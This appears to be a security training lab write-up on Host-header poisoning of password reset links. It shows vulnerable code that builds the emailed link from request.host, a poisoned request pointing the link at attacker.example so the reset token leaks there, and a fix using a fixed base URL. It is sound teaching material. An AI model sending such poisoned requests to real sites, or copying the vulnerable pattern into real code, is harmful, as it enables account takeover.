Day 2 / Lab 4B

Password Reset Link Built From the Host Header

This lab keeps the reset-token logic clean. The only intentional bug is that the password reset email builds its link from the incoming request host, which means an attacker can poison the domain sent to the victim.

Quick reminder

The HTTP Host header is client-controlled. If an app uses it to build absolute URLs for password reset emails, the email can end up pointing to an attacker-controlled domain.

Where the vulnerability comes from

The reset token is created correctly, but the reset URL is built from request.host.

token = str(uuid.uuid4())
conn.execute(
    "INSERT INTO reset_tokens (token, username) VALUES (?, ?)",
    (token, username)
)

reset_link = f"http://{request.host}{url_for('reset_password')}?token={token}"

The reset endpoint itself is clean. The token decides which account is reset, so the only flaw is in the emailed link generation.

How the exploit works

Trigger a password reset request and poison the host header at the same time.

Poisoned request

POST /forgot-password
Host: attacker.example
username=user

Email result

http://attacker.example/reset-password?token=<uuid>

The token is still valid, but the domain inside the email is now controlled by the attacker. If a victim clicks that link, the token is delivered to attacker infrastructure instead of the real application.

Fix

Use a trusted base URL configured by the application, not the request header.

# vulnerable
reset_link = f"http://{request.host}{url_for('reset_password')}?token={token}"

# fixed
PUBLIC_BASE_URL = "http://localhost:5007"
reset_link = f"{PUBLIC_BASE_URL}{url_for('reset_password')}?token={token}"
